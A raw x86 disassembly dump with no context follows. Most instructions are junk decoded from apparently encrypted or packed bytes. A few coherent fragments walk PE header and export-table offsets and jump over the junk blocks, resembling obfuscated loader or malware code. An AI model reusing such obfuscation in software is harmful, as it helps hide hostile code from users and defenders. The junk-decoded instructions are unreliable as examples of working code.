  40ad9e:	mov    eax,ds:0xd6be279a
  40ada3:	xlat   BYTE PTR ds:[ebx]
  40ada4:	add    eax,0xaa9464b8
  40ada9:	fisub  WORD PTR [ecx]
  40adab:	push   edx
  40adac:	repz jae 0x40ae1a
  40adaf:	pop    edi
  40adb0:	(bad)  
  40adb1:	mov    ebp,0xca3afeee
  40adb6:	xor    BYTE PTR [edi-0x44],ah
  40adb9:	lea    ecx,[esi+eax*4-0x3720537]
  40adc0:	je     0x40ae1d
  40adc2:	lods   eax,DWORD PTR ds:[esi]
  40adc3:	xor    esi,ecx
  40adc5:	xor    edi,esp
  40adc7:	push   ecx
  40adc8:	inc    esp
  40adc9:	cmp    eax,0xc2b32816
  40adce:	retf   
  40adcf:	xor    dh,dh
  40add1:	retf   
  40add2:	gs (bad) 
  40add4:	fistp  WORD PTR [eax-0x440a256e]
  40adda:	sbb    eax,0x1711e186
  40addf:	fiadd  DWORD PTR [ebp-0x5e411c]
  40ade5:	xlat   BYTE PTR ds:[ebx]
  40ade6:	cmp    DWORD PTR [ebp+edx*4-0x1f280fe6],edx
  40aded:	fs out 0x2c,al
  40adf0:	jp     0x40adc6
  40adf2:	pop    edi
  40adf3:	test   BYTE PTR [eax+0x14],bl
  40adf6:	sub    al,0xde
  40adf8:	adc    eax,0x768cb70c
  40adfd:	stos   DWORD PTR es:[edi],eax
  40adfe:	and    eax,0x681d0306
  40ae03:	scas   eax,DWORD PTR es:[edi]
  40ae04:	push   ecx
  40ae05:	xchg   edi,eax
  40ae06:	std    
  40ae07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae08:	lods   al,BYTE PTR ds:[esi]
  40ae09:	or     ah,0x0
  40ae0c:	test   eax,0xdd369b38
  40ae11:	push   ss
  40ae12:	iret   
  40ae13:	stos   WORD PTR es:[edi],ax
  40ae15:	lea    edi,[eax+eiz*1+0xc8a1ecc]
  40ae1c:	xchg   edx,eax
  40ae1d:	test   al,0x23
  40ae1f:	sbb    al,0xc
  40ae21:	js     0x40adca
  40ae23:	mov    edx,0x44de451
  40ae28:	sub    eax,0x4cc27700
  40ae2d:	popf   
  40ae2e:	mov    ebx,0xaf6b4ff3
  40ae33:	hlt    
  40ae34:	jge    0x40adf6
  40ae36:	loop   0x40ae61
  40ae38:	jmp    edx
  40ae3a:	(bad)  
  40ae3b:	adc    eax,0xad65ba6d
  40ae40:	or     ecx,edi
  40ae42:	sbb    dh,cl
  40ae44:	dec    ebx
  40ae45:	popf   
  40ae46:	aas    
  40ae47:	ins    DWORD PTR es:[edi],dx
  40ae48:	ror    DWORD PTR [ecx],0x10
  40ae4b:	fcom   DWORD PTR [edx-0x459b602a]
  40ae51:	mov    edi,0x110cb345
  40ae56:	inc    edi
  40ae57:	push   ebp
  40ae58:	jns    0x40adff
  40ae5a:	inc    ecx
  40ae5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae5c:	jp     0x40ae0a
  40ae5e:	daa    
  40ae5f:	fst    st(0)
  40ae61:	sub    BYTE PTR [edi+0x45d9023d],cl
  40ae67:	loop   0x40ae91
  40ae69:	enter  0x2c17,0xe9
  40ae6d:	mov    cl,0xf2
  40ae6f:	adc    BYTE PTR [ecx],0x4c
  40ae72:	cld    
  40ae73:	ss xchg bh,bl
  40ae76:	push   edx
  40ae77:	jae    0x40ae81
  40ae79:	aas    
  40ae7a:	xchg   edi,eax
  40ae7b:	pop    ebp
  40ae7c:	mov    eax,0x2daa6a1a
  40ae81:	gs fst st(1)
  40ae84:	hlt    
  40ae85:	sti    
  40ae86:	or     eax,0xb210ef85
  40ae8b:	jge    0x40ae29
  40ae8d:	and    edx,edx
  40ae8f:	jbe    0x40ae36
  40ae91:	or     DWORD PTR [edi-0x42],esi
  40ae94:	pop    ebx
  40ae95:	sbb    al,0x70
  40ae97:	xchg   edx,eax
  40ae98:	cmp    edi,DWORD PTR [esi]
  40ae9a:	add    eax,ebp
  40ae9c:	sbb    BYTE PTR [esi],ch
  40ae9e:	ret    
  40ae9f:	or     ch,cl
  40aea1:	xor    BYTE PTR [ebp+edx*2+0x190c5c89],dh
  40aea8:	xlat   BYTE PTR ds:[ebx]
  40aea9:	imul   ebx
  40aeab:	cmp    ch,BYTE PTR [ecx+eax*8+0x45d48c36]
  40aeb2:	pop    ss
  40aeb3:	aas    
  40aeb4:	adc    eax,0x7396980b
  40aeb9:	adc    eax,0x8a1f3b4c
  40aebe:	add    al,0x99
  40aec0:	and    DWORD PTR [edx],esp
  40aec2:	dec    eax
  40aec3:	jno    0x40ae8d
  40aec5:	(bad)  
  40aec6:	push   ebx
  40aec7:	xor    ah,BYTE PTR [ebp+0x53f08537]
  40aecd:	out    dx,al
  40aece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aecf:	and    cl,BYTE PTR [ebx-0x3e55abd9]
  40aed5:	rcr    BYTE PTR es:[edi+0x44],0xfa
  40aeda:	fwait
  40aedb:	aad    0xc2
  40aedd:	xchg   edi,eax
  40aede:	jbe    0x40af30
  40aee0:	cmp    eax,0x857a19cb
  40aee5:	jg     0x40ae7d
  40aee7:	inc    edx
  40aee8:	xchg   ebp,eax
  40aee9:	cmc    
  40aeea:	mov    bh,0x8b
  40aeec:	dec    ebp
  40aeed:	or     al,0x33
  40aeef:	(bad)  
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	xchg   edi,eax
  40af6a:	sub    BYTE PTR [ebx+0x70ea46cb],0x70
  40af71:	xchg   ebp,eax
  40af72:	jg     0x40afe4
  40af74:	jo     0x40afbc
  40af76:	ror    edx,1
  40af78:	xor    bh,BYTE PTR [edx]
  40af7a:	mov    eax,ds:0x2823274b
  40af7f:	shr    BYTE PTR [edi],0x49
  40af82:	lahf   
  40af83:	push   edi
  40af84:	mov    eax,ss:0x3fc952a4
  40af8a:	pop    ss
  40af8b:	pop    ecx
  40af8c:	push   edi
  40af8d:	das    
  40af8e:	test   DWORD PTR [edi],0xebdd5d2
  40af94:	fild   WORD PTR [esp+ebp*2+0x5d]
  40af98:	xchg   edx,eax
  40af99:	sbb    DWORD PTR [ebp+0x78d27bba],ebx
  40af9f:	and    bl,cl
  40afa1:	shr    BYTE PTR [esi],0xe
  40afa4:	pop    eax
  40afa5:	call   0xf14f0d66
  40afaa:	retf   
  40afab:	fld    st(0)
  40afad:	lock shl BYTE PTR ds:0x812a1e0d,0x62
  40afb5:	jne    0x40b014
  40afb7:	mov    DWORD PTR ds:0x2271c9cc,ecx
  40afbd:	jl     0x40afcc
  40afbf:	repnz bound esp,QWORD PTR [edx-0xb1921d0]
  40afc6:	div    BYTE PTR [edx+0x6a527d04]
  40afcc:	and    eax,0x5b32d39a
  40afd1:	loope  0x40b009
  40afd3:	add    al,0xfd
  40afd5:	add    DWORD PTR [esi],esp
  40afd7:	iret   
  40afd8:	sbb    ch,BYTE PTR [esp+eiz*8-0x6ffb5689]
  40afdf:	xchg   DWORD PTR [ecx+0x275d9df8],edi
  40afe5:	ffreep st(6)
  40afe7:	dec    edx
  40afe8:	hlt    
  40afe9:	imul   esi,DWORD PTR [eax],0x97ad8b6
  40afef:	jle    0x40b06f
  40aff1:	cdq    
  40aff2:	or     eax,DWORD PTR [edi-0x53d39339]
  40aff8:	pop    esp
  40aff9:	div    ah
  40affb:	inc    ebp
  40affc:	cld    
  40affd:	ficom  DWORD PTR [edi-0xa9876a9]
  40b003:	sbb    eax,0xcf4c99f9
  40b008:	push   0xc25b8bd3
  40b00d:	push   0xb459731
  40b012:	lds    ecx,FWORD PTR [esi]
  40b014:	pop    ds
  40b015:	xor    ecx,DWORD PTR [eax-0x77]
  40b018:	cli    
  40b019:	dec    ebx
  40b01a:	gs jb  0x40b08f
  40b01d:	adc    edx,DWORD PTR [edx-0x798483d9]
  40b023:	cld    
  40b024:	inc    ecx
  40b025:	jns    0x40b05d
  40b027:	mov    bl,0xad
  40b029:	gs mov bl,0xd5
  40b02c:	in     eax,dx
  40b02d:	pop    esp
  40b02e:	and    BYTE PTR [ecx-0x51],ch
  40b031:	sub    edx,ecx
  40b033:	rcr    BYTE PTR [ecx-0x8],0x7e
  40b037:	out    dx,eax
  40b038:	pop    ebx
  40b039:	xor    eax,0x258c81fc
  40b03e:	mov    edi,0x7fc5af86
  40b043:	inc    ecx
  40b044:	(bad)  
  40b045:	jb     0x40b0b9
  40b047:	(bad)  
  40b048:	imul   esi,DWORD PTR [ebp-0x11565648],0x28e023b
  40b052:	icebp  
  40b053:	dec    esi
  40b054:	push   ss
  40b055:	je     0x40b0c6
  40b057:	in     al,0xb0
  40b059:	mov    ecx,0xf57f0b7b
  40b05e:	xor    eax,0x6b6dfd02
  40b063:	test   BYTE PTR [edx-0x37],cl
  40b066:	popf   
  40b067:	cmp    al,0xe5
  40b069:	mov    DWORD PTR [edx+0x51],esi
  40b06c:	fstp   TBYTE PTR [edi+0x3249ae74]
  40b072:	adc    BYTE PTR [esi],0x4c
  40b075:	sub    DWORD PTR [esi+ebp*8+0x53ebe9e8],ebp
  40b07c:	mov    dh,0xec
  40b07e:	in     eax,0xf2
  40b080:	inc    eax
  40b081:	mov    BYTE PTR [esi],0xbc
  40b084:	sar    DWORD PTR ds:0x20d0ac27,cl
  40b08a:	mul    DWORD PTR [esi]
  40b08c:	push   ebx
  40b08d:	dec    ebx
  40b08e:	stos   BYTE PTR es:[edi],al
  40b08f:	loopne 0x40b02d
  40b091:	outs   dx,BYTE PTR ds:[esi]
  40b092:	sbb    BYTE PTR [edi],dh
  40b094:	mov    cl,0xa5
  40b096:	fdivr  QWORD PTR [ebx]
  40b098:	or     DWORD PTR [ecx],esi
  40b09a:	sbb    dh,bh
  40b09c:	fild   DWORD PTR ds:0xa9b223e
  40b0a2:	fcmovnbe st,st(6)
  40b0a4:	dec    ecx
  40b0a5:	fcmovnb st,st(7)
  40b0a7:	and    BYTE PTR [ecx],0xbd
  40b0aa:	adc    DWORD PTR [esi-0x17],0x18
  40b0ae:	jb     0x40b0d4
  40b0b0:	test   BYTE PTR [esi+0x6a],ah
  40b0b3:	ins    DWORD PTR es:[edi],dx
  40b0b4:	xor    dh,0x1c
  40b0b7:	inc    ebx
  40b0b8:	mov    DWORD PTR [esi],ebx
  40b0ba:	xchg   esi,eax
  40b0bb:	push   esp
  40b0bc:	adc    BYTE PTR [edi],dh
  40b0be:	int    0x49
  40b0c0:	(bad)  
  40b0c1:	jno    0x40b082
  40b0c3:	inc    edx
  40b0c4:	push   ebx
  40b0c5:	test   al,0x5a
  40b0c7:	sbb    al,0x97
  40b0c9:	stos   BYTE PTR es:[edi],al
  40b0ca:	adc    DWORD PTR [ecx+0x63],eax
  40b0cd:	stc    
  40b0ce:	adc    DWORD PTR [eax+0x1e],0xcdf28fa
  40b0d5:	xchg   edx,eax
  40b0d6:	loope  0x40b0ce
  40b0d8:	jle    0x40b0b1
  40b0da:	ins    DWORD PTR es:[edi],dx
  40b0db:	inc    edi
  40b0dc:	call   0x3b3e:0x1a501230
  40b0e3:	xchg   ebp,eax
  40b0e4:	mov    ecx,0x9f32b427
  40b0e9:	ins    DWORD PTR es:[edi],dx
  40b0ea:	adc    eax,0x151f03bd
  40b0ef:	test   ah,dh
  40b0f1:	or     ah,bh
  40b0f3:	fmul   QWORD PTR [esi+0x56]
  40b0f6:	sub    eax,0x90dc38c3
  40b0fb:	dec    edi
  40b0fc:	xchg   ecx,eax
  40b0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0fe:	ficomp DWORD PTR [ecx]
  40b100:	das    
  40b101:	in     eax,dx
  40b102:	shl    BYTE PTR [esp+esi*4+0x79],cl
  40b106:	inc    ecx
  40b107:	and    esi,DWORD PTR [edx+0x1f]
  40b10a:	mov    ah,0xf7
  40b10c:	out    0x5f,eax
  40b10e:	outs   dx,DWORD PTR ds:[esi]
  40b10f:	mov    ecx,DWORD PTR es:[ebp-0x18]
  40b113:	mov    eax,DWORD PTR [ebp-0x8]
  40b116:	mov    eax,DWORD PTR [eax]
  40b118:	mov    eax,DWORD PTR [eax+0x3c]
  40b11b:	lea    ecx,[ecx*8+0x78]
  40b122:	add    eax,ecx
  40b124:	mov    ecx,DWORD PTR [ebp-0x8]
  40b127:	mov    ecx,DWORD PTR [ecx]
  40b129:	mov    eax,DWORD PTR [eax+ecx*1]
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	fcmovu st,st(3)
  40b149:	int    0xa0
  40b14b:	fucomi st,st(0)
  40b14d:	jo     0x40b1bf
  40b14f:	xchg   ebp,eax
  40b150:	jg     0x40b1c2
  40b152:	jo     0x40b170
  40b154:	mov    esp,0xa6297b73
  40b159:	dec    ebx
  40b15a:	push   esp
  40b15b:	mov    esp,0x617bfc17
  40b160:	sbb    eax,0x398cf050
  40b165:	adc    al,0x2d
  40b167:	sbb    eax,0x49f1dd32
  40b16c:	push   0x18b2a245
  40b171:	fs stos BYTE PTR es:[edi],al
  40b173:	mov    ds:0x37ae5a9f,eax
  40b178:	jecxz  0x40b1c0
  40b17a:	fcom   DWORD PTR [ebx-0xa90a207]
  40b180:	cld    
  40b181:	jmp    0xdd7f:0x479a542f
  40b188:	(bad)  
  40b189:	(bad)  
  40b18b:	scas   al,BYTE PTR es:[edi]
  40b18c:	lock fbld TBYTE PTR [edi+eiz*8]
  40b190:	mov    bl,0x67
  40b192:	dec    ebx
  40b193:	mov    ebp,0x8f1100e
  40b198:	lahf   
  40b199:	aad    0x20
  40b19b:	add    al,0x2f
  40b19d:	inc    eax
  40b19e:	mov    al,ds:0xff61d5e1
  40b1a3:	loopne 0x40b162
  40b1a5:	dec    edx
  40b1a6:	mov    ds:0xef816a7c,eax
  40b1ab:	clc    
  40b1ac:	dec    esp
  40b1ad:	sbb    ebp,DWORD PTR [edi-0x6dd4804d]
  40b1b3:	xchg   ebx,eax
  40b1b4:	jne    0x40b173
  40b1b6:	test   DWORD PTR [ecx+0x74],0xd28c2ef7
  40b1bd:	mov    ebx,0x8c931f02
  40b1c2:	or     BYTE PTR [ecx-0x3e],ah
  40b1c5:	xchg   BYTE PTR [edi+0xfc0efb5],dh
  40b1cb:	inc    esp
  40b1cc:	push   esp
  40b1cd:	les    edi,FWORD PTR [ebx+0x69]
  40b1d0:	(bad)  
  40b1d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d2:	mov    esi,0xd59cbfa7
  40b1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d8:	neg    BYTE PTR [edi+0x66]
  40b1db:	push   cs
  40b1dc:	mov    eax,0xbbd8b33b
  40b1e1:	mov    al,ds:0xd1144f11
  40b1e6:	add    DWORD PTR [edi-0x51],edi
  40b1e9:	out    0x4b,eax
  40b1eb:	add    ah,BYTE PTR [ecx-0x3f9fd372]
  40b1f1:	stos   DWORD PTR es:[edi],eax
  40b1f2:	daa    
  40b1f3:	adc    ecx,DWORD PTR [ebp+0x70]
  40b1f6:	and    ch,ah
  40b1f8:	adc    al,0x87
  40b1fa:	xchg   ebx,eax
  40b1fb:	stc    
  40b1fc:	in     eax,0xb2
  40b1fe:	lahf   
  40b1ff:	icebp  
  40b200:	mov    al,BYTE PTR [edx+eax*1]
  40b203:	xchg   ecx,eax
  40b204:	mov    dh,0x6c
  40b206:	aas    
  40b207:	push   es
  40b208:	inc    ebp
  40b209:	out    0x29,al
  40b20b:	mov    ch,BYTE PTR [ebp-0x606c100e]
  40b211:	stos   BYTE PTR es:[edi],al
  40b212:	outs   dx,BYTE PTR ds:[esi]
  40b213:	push   esp
  40b214:	sbb    bh,BYTE PTR [ebp+0x1a]
  40b217:	add    cl,BYTE PTR [ebx-0xbf7953c]
  40b21d:	stc    
  40b21e:	sbb    BYTE PTR [edx],al
  40b220:	popf   
  40b221:	lahf   
  40b222:	lds    esi,FWORD PTR [eax+0x31]
  40b225:	push   ebx
  40b226:	stos   BYTE PTR es:[edi],al
  40b227:	arpl   WORD PTR [eax+esi*8-0x7df54e7f],sp
  40b22e:	and    eax,0xac77f02c
  40b233:	mov    ecx,0x9b09160e
  40b238:	mov    bh,0xa2
  40b23a:	not    DWORD PTR [eax+0x68]
  40b23d:	adc    eax,0xc51d4e2
  40b242:	(bad)  
  40b243:	aaa    
  40b244:	(bad)  
  40b245:	in     eax,dx
  40b246:	push   edx
  40b247:	sbb    al,0xd3
  40b249:	out    dx,al
  40b24a:	mov    ds:0x758fc840,eax
  40b24f:	lods   al,BYTE PTR ds:[esi]
  40b250:	nop
  40b251:	outs   dx,BYTE PTR ds:[esi]
  40b252:	adc    BYTE PTR [esp+ebp*4],ch
  40b255:	push   es
  40b256:	cld    
  40b257:	xor    cl,bl
  40b259:	popa   
  40b25a:	mov    edx,0xffbfd1c6
  40b25f:	popf   
  40b260:	sbb    eax,DWORD PTR [ebp+eax*2+0x27]
  40b264:	fstp   DWORD PTR [ecx-0x63733701]
  40b26a:	jp     0x40b2e2
  40b26c:	jnp    0x40b2b4
  40b26e:	daa    
  40b26f:	mov    dh,0xf8
  40b271:	inc    edi
  40b272:	mov    eax,0x7c3b68db
  40b277:	mov    al,ds:0x21d77895
  40b27c:	arpl   WORD PTR [eax+0x261586aa],dx
  40b282:	ss jg  0x40b287
  40b285:	repz daa 
  40b287:	adc    DWORD PTR [ecx],0x988dd47a
  40b28d:	jmp    0xd121ad58
  40b292:	jns    0x40b235
  40b294:	cmp    bl,BYTE PTR [ecx]
  40b296:	loope  0x40b221
  40b298:	cmp    BYTE PTR [esi+0x63cdb4bd],ch
  40b29e:	loopne 0x40b271
  40b2a0:	ds mov edx,0x935bd63
  40b2a6:	and    al,0xe8
  40b2a8:	pushf  
  40b2a9:	jge    0x40b22c
  40b2ab:	je     0x40b2c6
  40b2ad:	xchg   esi,eax
  40b2ae:	int    0x50
  40b2b0:	sbb    bh,BYTE PTR [edx-0x5578f2a3]
  40b2b6:	retf   
  40b2b7:	mov    dl,al
  40b2b9:	js     0x40b338
  40b2bb:	ins    DWORD PTR es:[edi],dx
  40b2bc:	jo     0x40b2e6
  40b2be:	pop    edx
  40b2bf:	popa   
  40b2c0:	(bad)  
  40b2c2:	daa    
  40b2c3:	dec    esp
  40b2c4:	popf   
  40b2c5:	jns    0x40b2bf
  40b2c7:	pop    ss
  40b2c8:	push   ss
  40b2c9:	ret    
  40b2ca:	adc    BYTE PTR [ebp+0x41],al
  40b2cd:	mov    cl,0x28
  40b2cf:	mov    bl,0xa3
  40b2d1:	js     0x40b273
  40b2d3:	fild   WORD PTR [ebx+0x1b]
  40b2d6:	adc    bl,BYTE PTR [ecx+eiz*8]
  40b2d9:	in     al,dx
  40b2da:	push   eax
  40b2db:	cmc    
  40b2dc:	push   ss
  40b2dd:	mov    cl,cl
  40b2df:	xor    dl,bh
  40b2e1:	sbb    DWORD PTR [ebp-0x23],eax
  40b2e4:	psubusb mm6,QWORD PTR [edi+ebp*4-0x7c8720d2]
  40b2ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2ed:	cmp    eax,0xe9dc4589
  40b2f2:	mov    bl,0x1
  40b2f4:	add    BYTE PTR [eax],al
  40b2f6:	mov    cl,0x4
  40b2f8:	icebp  
  40b2f9:	in     al,0x71
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0x87dbadc9
  40b303:	sti    
  40b304:	push   ds
  40b305:	(bad)  
  40b306:	jo     0x40b2fe
  40b308:	jo     0x40b37a
  40b30a:	xchg   ebp,eax
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b2ad
  40b30f:	mov    ch,0xef
  40b311:	out    0x9,eax
  40b313:	dec    edi
  40b314:	jb     0x40b2d0
  40b316:	xor    dl,BYTE PTR [ebx-0x30]
  40b319:	sub    DWORD PTR [esi+0x6dc9ec65],edi
  40b31f:	and    eax,DWORD PTR [ecx]
  40b321:	and    al,BYTE PTR [edx+0x4a6e2bf1]
  40b327:	sub    eax,0x14239cee
  40b32c:	pop    ebp
  40b32d:	aas    
  40b32e:	popa   
  40b32f:	imul   esp,edi,0x5373656e
  40b335:	enter  0x370,0x51
  40b339:	int    0xe0
  40b33b:	cmp    ebp,DWORD PTR [edx]
  40b33d:	or     ax,0x713b
  40b341:	sbb    BYTE PTR [ecx+0x7f],cl
  40b344:	push   ss
  40b345:	and    eax,0x3f9506c8
  40b34a:	std    
  40b34b:	cmp    esp,edi
  40b34d:	outs   dx,BYTE PTR ds:[esi]
  40b34e:	or     edi,DWORD PTR [esi]
  40b350:	add    DWORD PTR [ebx-0x2649806a],ebx
  40b356:	jae    0x40b2e6
  40b358:	daa    
  40b359:	adc    eax,0x60d165c7
  40b35e:	nop
  40b35f:	ret    0x8a3b
  40b362:	pop    ebp
  40b363:	mov    ds:0x96069e53,al
  40b368:	push   0x7d
  40b36a:	and    al,0x37
  40b36c:	mul    DWORD PTR [ebp-0x34]
  40b36f:	add    DWORD PTR [esi-0x69c65616],ebx
  40b375:	lods   al,BYTE PTR ds:[esi]
  40b376:	jns    0x40b327
  40b378:	(bad)  [edx+0x4cac67b]
  40b37e:	call   0x42a7c781
  40b383:	mov    edi,0xaa16d801
  40b388:	or     al,0x96
  40b38a:	test   DWORD PTR [esi-0x615dcc97],ecx
  40b390:	pop    eax
  40b391:	das    
  40b392:	and    BYTE PTR fs:[ebx],0xeb
  40b396:	fiadd  DWORD PTR [eax]
  40b398:	mov    esi,0x8a3d3a05
  40b39d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b39e:	les    ebp,FWORD PTR [ebx]
  40b3a0:	stc    
  40b3a1:	sti    
  40b3a2:	push   esi
  40b3a3:	(bad)  
  40b3a4:	adc    eax,0xe7818a0a
  40b3a9:	xor    eax,0xa11dbf49
  40b3ae:	and    BYTE PTR [esi+0x50],ah
  40b3b1:	and    BYTE PTR [eax-0x6b738df9],cl
  40b3b7:	push   ecx
  40b3b8:	test   BYTE PTR [edi-0x778863cd],ah
  40b3be:	dec    eax
  40b3bf:	out    dx,al
  40b3c0:	std    
  40b3c1:	and    cl,bl
  40b3c3:	dec    esp
  40b3c4:	popa   
  40b3c5:	imul   ebp,DWORD PTR [edi-0x1cad127f]
  40b3cc:	pop    ebp
  40b3cd:	call   0xfaa3:0x8a67cdc5
  40b3d4:	inc    edi
  40b3d5:	sti    
  40b3d6:	or     BYTE PTR [eax],0x91
  40b3d9:	push   ebx
  40b3da:	xchg   esp,eax
  40b3db:	cmp    eax,DWORD PTR [ebx+0x3]
  40b3de:	sbb    si,ax
  40b3e1:	push   es
  40b3e2:	jmp    0x40b44e
  40b3e4:	(bad)  
  40b3e5:	jmp    0x703ce880
  40b3ea:	mov    ebx,0xd5bab630
  40b3ef:	(bad)  
  40b3f0:	loopne 0x40b3d7
  40b3f2:	ins    DWORD PTR es:[edi],dx
  40b3f3:	scas   al,BYTE PTR es:[edi]
  40b3f4:	or     bh,0xf0
  40b3f7:	rcr    ecx,0x9f
  40b3fa:	lds    eax,FWORD PTR [eax-0x4eb5db68]
  40b400:	pushf  
  40b401:	push   edx
  40b402:	xor    ch,BYTE PTR [ebp+0x25ffdac2]
  40b408:	int    0x31
  40b40a:	sar    bl,cl
  40b40c:	(bad)  
  40b40d:	cmp    edx,eax
  40b40f:	lea    ebp,[ebx]
  40b411:	ds mov dh,0x65
  40b414:	inc    esp
  40b415:	scas   al,BYTE PTR es:[edi]
  40b416:	pop    ebp
  40b417:	jle    0x40b45d
  40b419:	push   edi
  40b41a:	mov    edi,0x8ebc88b5
  40b41f:	adc    esp,DWORD PTR [esi+ebx*8+0x33]
  40b423:	sub    dh,BYTE PTR [edi+0x2f]
  40b426:	sbb    DWORD PTR [ecx],esp
  40b428:	push   0x27
  40b42a:	adc    dl,dh
  40b42c:	in     eax,dx
  40b42d:	add    eax,0xac7a29fd
  40b432:	mov    ds:0x67f6b124,al
  40b437:	pushf  
  40b438:	push   esp
  40b439:	or     ebp,DWORD PTR [ebp+0x2904215]
  40b43f:	jge    0x40b483
  40b441:	loope  0x40b484
  40b443:	adc    BYTE PTR [ebp+0x5c8a8dd7],al
  40b449:	nop
  40b44a:	or     DWORD PTR [edx+0x0],0x48e9e47e
  40b451:	stos   DWORD PTR es:[edi],eax
  40b452:	lahf   
  40b453:	jp     0x40b465
  40b455:	push   eax
  40b456:	stos   DWORD PTR es:[edi],eax
  40b457:	dec    ecx
  40b458:	inc    esi
  40b459:	mov    ds:0x34288f37,eax
  40b45e:	mov    dh,0xe5
  40b460:	fiadd  DWORD PTR [ebp+0x8]
  40b463:	(bad)  [ecx+0x25]
  40b466:	dec    edx
  40b467:	test   BYTE PTR [edi-0x78a3bb47],0xa8
  40b46e:	aad    0xfd
  40b470:	pop    edi
  40b471:	pusha  
  40b472:	les    eax,FWORD PTR [edi]
  40b474:	and    ecx,0xa142180f
  40b47a:	shr    DWORD PTR [eax-0x43126be5],1
  40b480:	ins    DWORD PTR es:[edi],dx
  40b481:	scas   al,BYTE PTR es:[edi]
  40b482:	inc    ecx
  40b483:	mov    esp,0xe1c001cb
  40b488:	jno    0x40b454
  40b48a:	aaa    
  40b48b:	and    bl,BYTE PTR [eax-0x7f]
  40b48e:	in     eax,0xc4
  40b490:	push   cs
  40b491:	mov    ebp,DWORD PTR es:[edx-0x11a8a69b]
  40b498:	xchg   ecx,eax
  40b499:	stos   DWORD PTR es:[edi],eax
  40b49a:	jno    0x40b51a
  40b49c:	test   eax,0x88210114
  40b4a1:	mov    ebp,0x33708cb9
  40b4a6:	and    al,0x42
  40b4a8:	cmp    DWORD PTR [ebx+0x4d8b0845],ecx
  40b4ae:	loopne 0x40b4e3
  40b4b0:	mov    BYTE PTR [ebx],0xc7
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0x6e413075
  40b4de:	pop    ecx
  40b4df:	dec    esp
  40b4e0:	push   edi
  40b4e1:	xchg   ebp,eax
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b4cd
  40b4ea:	popa   
  40b4eb:	ins    DWORD PTR es:[edi],dx
  40b4ec:	sub    eax,0xb01c31ea
  40b4f1:	or     ecx,eax
  40b4f3:	sbb    BYTE PTR [edx-0x5c92bfd5],0xfd
  40b4fa:	mov    es,eax
  40b4fc:	pop    ds
  40b4fd:	sub    eax,0x454211f4
  40b502:	icebp  
  40b503:	not    ebp
  40b505:	push   0x27
  40b507:	ins    DWORD PTR es:[edi],dx
  40b508:	or     al,0xe8
  40b50a:	lea    edi,[eax+0x5d]
  40b50d:	sbb    cl,BYTE PTR [eax-0x63]
  40b510:	clts   
  40b512:	mov    ebx,0xe5b36693
  40b517:	sti    
  40b518:	iret   
  40b519:	jecxz  0x40b557
  40b51b:	sti    
  40b51c:	icebp  
  40b51d:	or     edi,DWORD PTR [ecx+edi*8+0x1d25217]
  40b524:	xor    BYTE PTR [edx],0x91
  40b527:	sub    eax,0xdac5e27e
  40b52c:	pusha  
  40b52d:	inc    eax
  40b52e:	test   ebx,0x9bf11a1c
  40b534:	icebp  
  40b535:	scas   al,BYTE PTR es:[edi]
  40b536:	xor    eax,0xcc355f65
  40b53b:	fcmovnb st,st(1)
  40b53d:	jno    0x40b558
  40b53f:	test   ch,al
